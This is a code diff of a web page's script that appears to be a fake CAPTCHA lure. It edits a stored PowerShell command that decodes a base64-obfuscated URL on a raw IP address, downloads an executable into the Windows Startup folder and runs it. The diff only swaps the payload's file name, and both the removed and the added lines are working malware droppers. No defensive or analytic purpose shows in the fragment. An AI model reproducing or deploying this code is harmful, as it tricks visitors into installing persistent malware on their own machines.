@@ -163,7 +163,7 @@
     </div>
 
     <script>
-        const command = `powershell -c "$u='aHR0cDovLzMxLjIyMC40OS4xNy9jb25zby5leGU=';$p=[System.IO.Path]::Combine([System.Environment]::GetFolderPath('Startup'), 'conso.exe');iwr ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($u))) -OutFile $p;ii $p"`;
+        const command = `powershell -c "$u='aHR0cDovLzMxLjIyMC40OS4xNy9lbGludC5leGU=';$p=[System.IO.Path]::Combine([System.Environment]::GetFolderPath('Startup'), 'conso.exe');iwr ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($u))) -OutFile $p;ii $p"`;
         
         document.getElementById('captcha-checkbox').addEventListener('change', function() {
             if (this.checked) {
